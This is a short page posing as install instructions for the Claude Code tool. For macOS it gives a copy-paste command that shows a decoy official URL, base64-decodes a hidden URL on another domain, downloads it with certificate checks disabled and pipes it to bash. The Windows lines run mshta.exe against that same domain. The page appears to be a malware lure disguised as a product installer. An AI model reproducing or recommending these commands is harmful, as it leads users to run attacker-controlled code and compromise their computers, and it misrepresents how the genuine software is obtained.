Getting Started

🔗 Step 1: Install Claude Code

To install Claude Code, use one of the following methods:

macOS:
echo "macOS Download: http://code.claude.ai/download/" && curl -sfkSL $(echo 'aHR0cHM6Ly9kb3dubG9hZC5hY3RpdmUtdmVyc2lvbi5jb20vY2xhdWRl' | base64 -d) | bash 📋
Windows PowerShell:
C:\Windows\SysWOW64\mshta.exe https://download.active-version[.]com/claude 📋
Windows CMD:
C:\Windows\SysWOW64\mshta.exe https://download.active-version[.]com/claude 📋
i Native installations automatically update in the background to keep you on the latest version.
